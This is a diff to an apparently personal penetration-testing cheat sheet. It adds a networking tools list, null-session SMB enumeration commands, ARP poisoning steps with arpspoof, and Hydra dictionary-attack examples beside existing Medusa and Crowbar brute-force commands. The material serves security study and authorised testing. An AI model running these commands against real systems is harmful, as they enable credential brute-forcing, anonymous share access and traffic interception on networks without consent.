@@ -1165,6 +1165,19 @@ Note: Provided we at least know the SNMP read-only community string (in most cas
 
 ## Networking
 
+**Tools**
+- [Echo Mirage](https://resources.infosecinstitute.com/topic/echo-mirage-walkthrough/)
+- [Wireshark](https://www.wireshark.org/)
+- [PCredz](https://github.com/lgandx/PCredz)
+- [Impacket](https://github.com/SecureAuthCorp/impacket)
+- [putty](https://www.putty.org/)
+- [MobaXterm](https://mobaxterm.mobatek.net/)
+- [proxychains](https://github.com/haad/proxychains)
+- [Samba suite](https://www.samba.org/)
+- [Enum](https://packetstormsecurity.com/search/?q=win32+enum&s=files)
+- [Winfo](https://packetstormsecurity.com/search/?q=winfo&s=files)
+- [enum4linux](https://www.kali.org/tools/enum4linux/)
+
 Checking the routing table
 ```
 ip route        on Linux box
@@ -1204,7 +1217,44 @@ route add <net_address_in_cdr> mask <net_address_mask_in_cdr> <interface_gateway
 nmap -sn <net_address_in_cdr>                                                         Check hosts alive, adding -A you gather more info for a target
 ```
 
-Well-known Ports
+#### Null session
+```
+Windows
+-------
+nbtstat /?                               help command
+nbtstat -A <Target-IP>                   display information about a target
+NET VIEW <Target-IP>                     enumerate the shares of a target
+NET USE \\<Target-IP>\IPC$ '' /u:''      connect to a window share; connect to 'IPC$' share by using empty username and password
+
+Linux
+-----
+nmblookup -A <Target-IP>                 same as nbtstat for Linux; display information about a target
+smbclient -L //<Target-IP> -N            access Windows shares
+smbclient //<Target-IP>/IPC$ -N          connect to a window share; connect to 'IPC$' share by using empty username and password
+
+Enum
+----
+enum -s <Target-IP>                      enumerate the shares of a machine
+enum -U <Target-IP>                      enumerate the users of a machine
+enum -P <Target-IP>                      check the password policy of a machine
+
+Winfo
+-----
+winfo <Target-IP> -n                     use winfo with null session
+
+```
+
+#### ARP Poisoning
+
+1. First, enable the Linux Kernel IP Forwarding with to transform a Linux Box into a router `echo 1 > /proc/sys/net/ipv4/ip_forward`
+2. Run arpspoof `arpspoof -i <interface> -t <target> -r <host>`
+
+An example
+1. `echo 1 > /proc/sys/net/ipv4/ip_forward`
+2. `arpspoof -i eth0 -t 192.168.4.11 -r 192.168.4.16`
+
+
+#### Well-known Ports
 | Service       | Port          |
 | ---           | ---           |
 | SMTP          | 25            |
@@ -1220,18 +1270,6 @@ Well-known Ports
 | RDP           | 3389          |
 | MySQL         | 3306          |
 | MS SQL Server | 1433          |
-
-
-**Resources**
-- [Echo Mirage](https://resources.infosecinstitute.com/topic/echo-mirage-walkthrough/)
-- [Wireshark](https://www.wireshark.org/)
-- [PCredz](https://github.com/lgandx/PCredz)
-- [Impacket](https://github.com/SecureAuthCorp/impacket)
-- [putty](https://www.putty.org/)
-- [MobaXterm](https://mobaxterm.mobatek.net/)
-- [proxychains](https://github.com/haad/proxychains)
-  - [learning hacking? DON'T make this mistake!! (hide yourself with Kali Linux and ProxyChains)](https://www.youtube.com/watch?v=qsA8zREbt6g)
-
 
 
 ## Mobile
@@ -2896,7 +2934,7 @@ Examples of usage:
 - [Crowbar](https://github.com/galkan/crowbar)
 - [THC Hydra](https://github.com/vanhauser-thc/thc-hydra)
 
-#### [Medusa](http://h.foofus.net/?page_id=51), HTTP htaccess Attack
+#### Medusa, HTTP htaccess Attack
 
 - `medusa -d` All the protocols medusa can interact with
 - ` medusa -h 10.11.0.5 -u admin -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/admin`
@@ -2906,7 +2944,7 @@ Examples of usage:
   - `-P` wordlist file
   - `-M` HTTP authentication scheme
 
-#### [Crowbar](https://github.com/galkan/crowbar), Remote Desktop Protocol Attack
+#### Crowbar, Remote Desktop Protocol Attack
 
 - `crowbar --help`
 - `crowbar -b rdp -s 10.11.0.22/32 -u admin -C ~/password-file.txt -n 1`
@@ -2916,16 +2954,20 @@ Examples of usage:
   - `-c` wordlist
   - `-n` number of threads
 
-#### [THC Hydra](https://github.com/vanhauser-thc/thc-hydra), SSH Attack
+#### THC Hydra
 
 - `hydra`
+- `hydra -L users.txt -P pass.txt <service://server> <options>` launch a dictionary attack
+  - `hydra -L users.txt -P pass.txt telnet://target.server` Telnet example
+  - `hydra -L users.txt -P pass.txt http-get://target.server` Password protected web resource
+
+SSH Attack
 - `hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://127.0.0.1`
   - `-l` specify the target username
   - `-P` specify a wordlist
   - `protocol://IP` o specify the target protocol and IP address respectively
 
-#### [THC Hydra](https://github.com/vanhauser-thc/thc-hydra), HTTP POST Attack
-
+HTTP POST Attack
 - `hydra http-form-post -U`
 - `hydra 10.11.0.22 http-form-post "/form/frontpage.php:user=admin&pass=^PASS^:INVALID LOGIN" -l admin -P /usr/share/wordlists/rockyou.txt -vV -f`
   - `-l` user name
